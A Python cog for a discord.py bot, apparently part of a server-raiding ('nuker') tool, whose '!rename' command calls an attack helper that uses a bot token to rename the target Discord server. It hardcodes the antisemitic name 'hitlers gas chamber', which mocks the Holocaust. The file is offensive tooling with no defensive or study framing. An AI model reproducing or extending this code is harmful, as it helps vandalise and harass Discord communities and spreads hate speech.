"""!rename - rename the server."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class Rename(commands.Cog):
    """rename the server."""

    @commands.command(name="rename")
    async def rename(self, ctx: commands.Context):
        """rename the server."""
        await run_attack(
            ctx, "Rename Server",
            lambda g: attacks.rename_guild(
                   token(), g.id, "hitlers gas chamber"))


async def setup(bot: commands.Bot):
    await bot.add_cog(Rename())
